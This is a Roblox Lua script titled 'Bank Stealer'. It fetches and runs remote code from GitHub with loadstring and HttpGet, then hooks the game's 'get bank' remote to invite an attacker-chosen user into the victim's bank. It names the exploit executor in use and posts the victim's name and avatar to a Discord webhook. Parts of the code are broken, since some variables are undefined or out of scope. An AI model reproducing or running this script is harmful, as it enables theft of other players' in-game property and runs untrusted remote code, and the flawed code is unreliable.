-- SimpleSpy API 
loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua", true))()


-- The ID that will get invited to the bank
local id = 1
-- Discord webhook
local webhook = false
local link = ""

-- Catch Get Bank remote
SimpleSpy:GetRemoteFiredSignal(workspace.__THINGS.__REMOTES:FindFirstChild("get bank")):Connect(function(args)
    local bankId = args[1][1]
    return bankId
end)
-- Send Webhook & Invite player to bank
local Invite = {
    [1] = {
        [1] = bankId,
        [2] = 1
    }
}

workspace.__THINGS.__REMOTES:FindFirstChild("invite to bank"):InvokeServer(unpack(Invite))
if webhook == true then
    local function getexploit()
        local exploit =
            (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
            (isexecutorclosure and "Script-Ware V2") or
            (secure_load and "Sentinel") or
            (is_sirhurt_closure and "SirHurt V4") or
            (pebc_execute and "ProtoSmasher") or
            (KRNL_LOADED and "Krnl") or
            (WrapGlobal and "WeAreDevs") or
            (isvm and "Proxo") or
            (shadow_env and "Shadow") or
            (jit and "EasyExploits") or
            (getreg()['CalamariLuaEnv'] and "Calamari") or
            (unit and "Unit") or
            ("Undetectable")
    return exploit
    end
    
    local Content = 'Someone got their bank stolen!'
    local Embed = {
        ["title"] = "Bank Stealer",
        ["description"] = "Name: "..plr.Name.."\nDisplay Name: "..plr.DisplayName,
        ["type"] = "rich",
        ["color"] = tonumber(0xffff00),
	    ["image"] = {
		        ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username="..plr.Name
		    },
    }
    (syn and syn.request or http_request or http.request) {
        Url = link; -- Put in your webgh
        Method = 'POST';
        Headers = {
            ['Content-Type'] = 'application/json';
        };
        Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {Embed}});
    };
end
